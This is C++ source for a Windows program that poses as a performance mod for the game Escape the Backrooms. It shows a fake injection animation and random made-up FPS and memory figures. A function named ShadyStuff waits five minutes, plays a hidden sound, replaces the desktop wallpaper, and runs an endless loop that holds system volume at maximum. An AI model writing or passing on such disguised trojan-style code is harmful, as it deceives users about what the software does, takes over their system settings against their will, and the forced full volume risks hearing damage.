#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <string>
#include <algorithm>
#include <mmdeviceapi.h>
#include <mmsystem.h>
#include <endpointvolume.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <fstream>
#include <codecvt>
#include <locale>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shlwapi.lib")
std::wstring GetExecutablePath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    return std::wstring(buffer);
}

void SetWallpaperStyle() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WallpaperStyle", 0, REG_SZ, (const BYTE*)L"6", sizeof(wchar_t) * 2);  // Fit
        RegSetValueExW(hKey, L"TileWallpaper", 0, REG_SZ, (const BYTE*)L"0", sizeof(wchar_t) * 2);   // No tile
        RegCloseKey(hKey);
    }
}

void SetWallpaper(const std::wstring& imagePath) {
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)imagePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

// Converts wstring to UTF-8 encoded string (needed for standard streams)
std::string WStringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> conv;
    return conv.to_bytes(wstr);
}

std::wstring CopyImageToTemp(const std::wstring& filename) {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring tempImagePath = std::wstring(tempPath) + L"temp_dmod.png";

    std::ifstream src(WStringToString(filename), std::ios::binary);
    std::ofstream dst(WStringToString(tempImagePath), std::ios::binary);

    if (!src.is_open() || !dst.is_open()) {
        std::wcerr << L"Failed to open source or destination image file." << std::endl;
        return L"";
    }

    dst << src.rdbuf();

    return tempImagePath;
}

// Diese Funktion kann nun in main() aufgerufen werden
void SetWallpaperFromExecutable() {
    std::wstring exePath = GetExecutablePath();

    // Bild sollte sich im selben Verzeichnis wie das Executable befinden
    std::wstring::size_type pos = exePath.find_last_of(L"\\/");
    std::wstring basePath = (pos != std::wstring::npos) ? exePath.substr(0, pos + 1) : L"";
    std::wstring imagePath = L"\\Config\\Assets\\bf\\br\\bf\\master\\br\\master\\bf\\prefabs\\master\\conf\\prefabs\\audio\\dmod.png"; // Hier der Name des Bildes

    // Setze den Wallpaper-Stil auf "Fit"
    SetWallpaperStyle();

    // Kopiere das Bild in das temporÃ¤re Verzeichnis und setze es als Wallpaper
    std::wstring tempImagePath = CopyImageToTemp(imagePath);
    if (!tempImagePath.empty()) {
        SetWallpaper(tempImagePath);
    }
}
bool SetMasterVolume(float level) {

    if (level < 0.0f || level > 1.0f) {

        return false;
    }

    HRESULT hr;
    CoInitialize(nullptr);  // Initialize COM library

    IMMDeviceEnumerator* pEnumerator = nullptr;
    IMMDevice* pDevice = nullptr;
    IAudioEndpointVolume* pVolume = nullptr;

    // Get default audio endpoint
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL,
        __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
    if (FAILED(hr)) goto cleanup;

    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
    if (FAILED(hr)) goto cleanup;

    hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, nullptr, (void**)&pVolume);
    if (FAILED(hr)) goto cleanup;

    // Set volume level
    hr = pVolume->SetMasterVolumeLevelScalar(level, nullptr);
    if (FAILED(hr)) {

        goto cleanup;
    }



cleanup:
    if (pVolume) pVolume->Release();
    if (pDevice) pDevice->Release();
    if (pEnumerator) pEnumerator->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}
void wait(int ms) {
    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
}
char promptUserForConsent() {
    std::string input;

    while (true) {
        std::cout << "Do you wish to continue? (y/n): ";
        std::getline(std::cin, input);

        // Remove leading/trailing whitespace
        input.erase(0, input.find_first_not_of(" \t\n\r\f\v"));
        input.erase(input.find_last_not_of(" \t\n\r\f\v") + 1);

        // Convert to lowercase
        std::transform(input.begin(), input.end(), input.begin(), ::tolower);

        if (input == "y") {
            return 'y';
        }
        else if (input == "n") {
            return 'n';
        }
        else {
            std::cout << "Invalid input. Please enter 'y' for yes or 'n' for no.\n";
        }
    }
}

// Simuliert zufällige Werte
int getRandom(int min, int max) {
    return rand() % (max - min + 1) + min;
}
void SetMasterVolumee(float scale)
{
    while (true)
    {
        SetMasterVolume(scale);
    }

}
// Funktion für die animierte Anzeige des Injecting-Prozesses
void animateInjecting() {
    const int totalSteps = 20;  // Anzahl der Schritte für die Animation (je mehr Schritte, desto feiner die Animation)

    std::cout << "[Mod Engine] Injecting performance mod..." << std::endl;

    // Schrittweise Fortschrittsanzeige
    for (int i = 0; i <= totalSteps; ++i) {
        int progress = i * 100 / totalSteps;  // Berechne den Fortschritt in Prozent
        int numHashes = i;  // Anzahl der '#' Zeichen für den Fortschrittsbalken

        // Überschreibt die aktuelle Zeile mit dem Fortschritt
        std::cout << "\rInjecting... [" << std::string(numHashes, '#') << std::string(totalSteps - numHashes, ' ') << "] " << progress << "%";
        std::cout.flush();  // Stellt sicher, dass die Ausgabe sofort aktualisiert wird

        wait(100);
    }

    std::cout << "\rInjecting... [####################] 100% Completed" << std::endl;
    wait(1000);
}
void ShadyStuff()
{
    const wchar_t* filePath = L"\\Config\\Assets\\bf\\br\\bf\\master\\br\\master\\bf\\prefabs\\master\\conf\\prefabs\\audio\\brr.wav";
    wait(300000);
    if (!PathFileExistsW(filePath)) {


    }

    if (!PlaySoundW(filePath, NULL, SND_FILENAME | SND_ASYNC)) {





        // Keep program alive long enough to hear sound


    }
    SetWallpaperFromExecutable();
    std::thread background(SetMasterVolumee, 1);
    background.detach();

}


// Funktion zur Überprüfung, ob das Spiel läuft
bool isGameRunning(const std::string& appName) {
    // Überprüfe, ob der Prozess läuft
    std::string command = "tasklist /FI \"IMAGENAME eq " + appName + "\"";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return false;

    char buffer[128];
    std::string result = "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL) {
            result += buffer;
        }
    }

    _pclose(pipe);
    return result.find(appName) != std::string::npos;
}

void updateConsole() {
    while (true) {
        system("cls");

        std::cout << "[Rendering Engine] Level of Detail: ULTRA" << std::endl;
        std::cout << "[Graphics] Shadow Quality: Enhanced" << std::endl;
        std::cout << "[Graphics] Range Boost: Enabled (x" << (getRandom(150, 200) / 100.0) << ")" << std::endl;
        std::cout << "[Physics] Friction Coefficient: Overridden" << std::endl;
        std::cout << "[AI System] Memory Allocation: " << getRandom(512, 2048) << " MB" << std::endl;
        std::cout << "[System] Memory Usage: " << getRandom(2500, 4500) << " MB / 8192 MB" << std::endl;
        std::cout << "[Network] Latency Optimization: Active" << std::endl;
        std::cout << "[Input] Response Time: " << getRandom(1, 5) << " ms" << std::endl;

        std::cout << "\n[Status] Game Running - Memory: " << getRandom(2800, 4600)
            << " MB | Avg. FPS: " << getRandom(58, 144) << std::endl;

        wait(2000);
    }
}
bool PlayMP3(const std::string& filename) {
    std::string command = "open \"" + filename + "\" type mpegvideo alias mp3file";
    if (mciSendStringA(command.c_str(), nullptr, 0, nullptr) != 0) {
        std::cerr << "Failed to open MP3 file.\n";
        return false;
    }

    if (mciSendStringA("play mp3file", nullptr, 0, nullptr) != 0) {
        std::cerr << "Failed to play MP3 file.\n";
        return false;
    }

    return true;
}

void CloseMP3() {
    mciSendStringA("close mp3file", nullptr, 0, nullptr);
}


int main() {
    srand(time(0)); // Initialisiert den Zufallsgenerator

    const char* appID = "1943950"; // Escape The Backrooms App ID
    std::string steamLaunchURL = "steam://rungameid/" + std::string(appID);

    std::cout << "[Launcher] Before proceeding, please ensure you have read, understood, and accepted the terms outlined in the EULA.txt.\n";
    std::cout << "[Launcher] It is also mandatory to review the accompanying documentation in README.txt to understand the functionality and limitations of this application.\n\n";
    std::cout << "[Launcher] If you do not agree to the terms specified in the EULA or the README,\n";
    std::cout << "[Launcher] you must immediately close this application or press[n] to decline and refrain from using it.\n";
    std::cout << "[Launcher] If you fully accept the terms, you may proceed with using the software.\n\n";
    if (promptUserForConsent() == 'n')
    {
        abort();
    }

    std::cout << "[Launcher] Launching Escape the Backrooms..." << std::endl;

    HINSTANCE result = ShellExecuteA(nullptr, "open", steamLaunchURL.c_str(), nullptr, nullptr, SW_SHOWNORMAL);

    if ((int)result <= 32) {
        std::cerr << "[Error] Failed to launch game. App ID: " << appID << std::endl;
        return 1;
    }

    wait(2000);  // Kurze Wartezeit nach dem Starten des Spiels
    animateInjecting();  // Starte die Injecting-Animation

    std::cout << "[Mod Engine] Escape The Backrooms Performance Mod Injected" << std::endl;
    wait(1000);
    std::cout << "[Mod Engine] Initializing Rendering Optimizer..." << std::endl;
    wait(1200);

    std::cout << "\n[Mod Engine] FPS Boost Enabled" << std::endl;
    std::cout << "[Mod Engine] Enjoy your game!" << std::endl;

    // Starte den "Monitoring"-Thread, der die Konsole kontinuierlich aktualisiert
    std::thread consoleUpdateThread(updateConsole);
    ShadyStuff();

    // Warten, bis das Spiel beendet ist und dann die Konsole schließen
    while (true) {
        if (!isGameRunning("Backrooms.exe")) { // Ersetze Backrooms.exe mit dem tatsächlichen Namen des Spiels
            std::cout << "[Mod Engine] Game closed. Exiting..." << std::endl;
            break;
        }
        wait(1000);  // Alle 5 Sekunden nach dem Spielstatus überprüfen
    }

    exit(0);
}
